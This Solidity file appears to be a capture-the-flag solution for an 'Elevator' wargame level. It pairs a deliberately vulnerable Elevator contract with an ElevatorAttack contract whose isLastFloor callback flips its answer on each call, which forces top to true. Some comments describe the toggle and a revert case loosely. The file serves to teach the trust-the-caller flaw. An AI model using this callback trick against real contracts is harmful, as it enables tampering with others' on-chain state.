// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// We need to get to the top of the floor
// state variable top is a boolean intialized at false ofc


interface Building {
    function isLastFloor(uint256) external returns (bool);
}

contract Elevator {
    bool public top;
    uint256 public floor;

    function goTo(uint256 _floor) public {
        Building building = Building(msg.sender);

        // The line Building building = Building(msg.sender); will revert when we try 
        // to call the goTo() function directly from the Elevator contract 
        // because msg.sender is the Elevator contract itself, not an instance of a contract that implements the Building interface.

        // The first condition checks if the requested _floor is not the last floor 
        // (using the isLastFloor function of the Building contract).
        if (!building.isLastFloor(_floor)) {
            floor = _floor; // If it's not the last floor, the elevator's current floor is updated to _floor.
            top = building.isLastFloor(floor); // Then it checks if the new floor is the last floor and updates the top variable accordingly.
        }
    }
}  

// Set up the hacker contract
// Call function setTop
// Call setTop() ==> calls goTo() function in parent contract Elevator
// In goTo(): top = building.isLastFloor(floor) so it sets top to the result of isLastFloor
// It then interacts with Building(msg.sender).isLastFloor(_floor) 
// which, in this case, is the ElevatorAttack contract itself since msg.sender is ElevatorAttack.

contract ElevatorAttack {
    bool public pwn = true;
    Elevator public target;

    constructor (address _targetAddress)  {
        target = Elevator(_targetAddress);
    }

    function isLastFloor(uint)public returns (bool){
        pwn = !pwn; // Here we toggle from false to true
        return pwn;
    }
    function setTop(uint _floor) public {
        target.goTo(_floor);
    }
}